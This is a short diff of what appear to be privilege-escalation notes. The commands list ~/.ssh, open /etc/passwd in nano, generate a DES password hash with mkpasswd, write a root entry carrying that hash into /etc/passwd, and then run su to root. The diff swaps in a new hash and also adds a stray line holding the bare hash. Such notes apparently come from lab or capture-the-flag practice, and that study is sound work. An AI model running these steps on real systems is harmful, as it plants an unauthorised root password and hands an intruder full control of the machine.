@@ -463,7 +463,8 @@ cd ~/.ssh; ls -la
 ls -la /etc/passwd
 nano /etc/passwd
 mkpasswd -m descrypt 'password'
-root:Vg4sD8/6ZPqpk:0:0:root:/root:/usr/bin/bash
+piS1wHGBkJ3z2
+root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash
 su root
 password
 
